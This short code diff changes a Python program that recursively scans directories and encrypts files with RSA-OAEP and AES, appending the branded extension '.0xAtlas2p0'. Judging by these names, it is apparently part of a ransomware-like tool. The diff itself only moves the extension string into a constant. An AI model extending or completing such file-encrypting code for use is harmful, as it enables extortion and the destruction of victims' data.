@@ -4,7 +4,7 @@ from Crypto.Cipher import PKCS1_OAEP, AES
 from pathlib import Path
 
 
-
+encryptionExtension = ".0xAtlas2p0"
 
 def scanRecurse(baseDir):
     
@@ -46,7 +46,7 @@ def encrypt(dataFile, publicKey):
         return -1
 
 
-    encryptedFile = fileName + '.0xAtlas2p0'
+    encryptedFile = fileName + encryptionExtension
 
     delimiter = b'$'
 
